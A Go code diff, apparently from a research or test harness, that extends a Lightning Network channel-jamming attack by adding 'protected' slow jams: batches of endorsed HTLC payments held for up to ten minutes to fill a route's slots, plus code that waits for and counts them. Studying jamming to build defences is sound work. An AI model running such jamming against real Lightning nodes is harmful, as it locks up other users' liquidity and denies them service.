@@ -4,6 +4,7 @@ import (
 	"context"
 	"fmt"
 	"log"
+	"sync"
 	"time"
 
 	"github.com/lightninglabs/lndclient"
@@ -53,17 +54,88 @@ func runAttack(ctx context.Context, graph *GraphHarness,
 	// While WIP, cancel these payments back for easier cleanup.
 	log.Printf("Dispatched: %v general slow jams", len(chans))
 
-	for i, jam := range chans {
-		log.Printf("Canceling slowjam: %v early", i)
-		close(jam.req.EarlySettle)
+	var wg sync.WaitGroup
 
-		select {
-		case <-jam.resp:
-		case <-ctx.Done():
-			return ctx.Err()
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+
+		log.Printf("Waiting for: %v general slow jams", len(chans))
+		n, err := waitForJams(ctx, chans)
+		if err != nil {
+			log.Printf("Wait for general jams: %v", err)
 		}
+
+		log.Printf("Of %v general jams, %v reached destination",
+			len(chans), n)
+	}()
+
+	jamAmt := lnwire.MilliSatoshi(400_000)
+	zeroToTwo, err := jammer.LndNodes.GetNode(0).Client.QueryRoutes(
+		ctx,
+		lndclient.QueryRoutesRequest{
+			PubKey:       jammer.LndNodes.GetNode(2).NodePubkey,
+			AmtMsat:      jamAmt,
+			FeeLimitMsat: lnwire.MaxMilliSatoshi,
+		},
+	)
+	if err != nil {
+		return fmt.Errorf("0 -> 2: %w", err)
 	}
+
+	protectedChans, err := jamProtected(ctx, jammer, zeroToTwo)
+	if err != nil {
+		return fmt.Errorf("slow jam protected: %w", err)
+	}
+
+	log.Printf("Dispatched: %v protected slow jams", len(chans))
+
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+
+		log.Printf("Waiting for: %v protected slow jams", len(protectedChans))
+		n, err := waitForJams(ctx, protectedChans)
+		if err != nil {
+			log.Printf("Wait for protected jams: %v", err)
+		}
+
+		log.Printf("Of %v protected jams, %v reached destination",
+			len(protectedChans), n)
+	}()
+
+	log.Printf("Waiting for slow jams to complete")
+	wg.Wait()
+
 	return nil
+}
+
+// waitForJams waits for a set of jamming payments to complete. We just wait
+// in the order that they were dispatched, as this is the order we'd expect
+// them to resolve if the payment reaches the holding party. It's not critical
+// if some payments are waiting in this queue to be seen as resolved.
+func waitForJams(ctx context.Context, jams []jamPair) (int, error) {
+	var (
+		err         error
+		reachedDest int
+	)
+
+	for _, jam := range jams {
+		select {
+		case r := <-jam.resp:
+			if len(r.Htlcs) > 0 {
+				reachedDest++
+			}
+
+		// Even if we error out, we want to cancel all of our payments.
+		case <-ctx.Done():
+			err = ctx.Err()
+		}
+
+		close(jam.req.EarlySettle)
+	}
+
+	return reachedDest, err
 }
 
 type jamPair struct {
@@ -86,8 +158,54 @@ func getSlowJamHold(ctx context.Context, route *lndclient.QueryRoutesResponse,
 	relativeHold := absHoldHeight - info.BlockHeight
 
 	// Assume 5 minute blocks
-	return time.Duration(relativeHold) * 5 * time.Minute, nil
+	holdTime := time.Duration(relativeHold) * 5 * time.Minute
+
+	// Our goal is to hold for an hour, so we'll pick the minimum.
+	if holdTime < time.Minute*10 {
+		return holdTime, nil
+	}
+
+	return time.Minute * 10, nil
 }
+
+func jamProtected(ctx context.Context, j *JammingHarness,
+	route *lndclient.QueryRoutesResponse) ([]jamPair, error) {
+
+	wait, err := getSlowJamHold(ctx, route, j)
+	if err != nil {
+		return nil, err
+	}
+
+	var jamChans []jamPair
+	for i := 0; i < 483/2; i++ {
+		req := JammingPaymentReq{
+			AmtMsat:         route.TotalAmtMsat - route.TotalFeesMsat,
+			SourceIdx:       0,
+			DestIdx:         2,
+			EndorseOutgoing: true,
+			SettleWait:      wait,
+			Settle:          false,
+			EarlySettle:     make(chan struct{}),
+		}
+
+		if i%50 == 0 && i != 0 {
+			log.Printf("Sent %v protected jams", i)
+		}
+
+		resp, err := j.JammingPaymentRoute(ctx, req, *route)
+		if err != nil {
+			return nil, fmt.Errorf("%v - probe: %v", i, err)
+		}
+
+		jamChans = append(jamChans, jamPair{
+			req:  req,
+			resp: resp,
+		})
+	}
+
+	return jamChans, nil
+}
+
 func slowJamGeneral(ctx context.Context, j *JammingHarness) (
 	[]jamPair, error) {
 
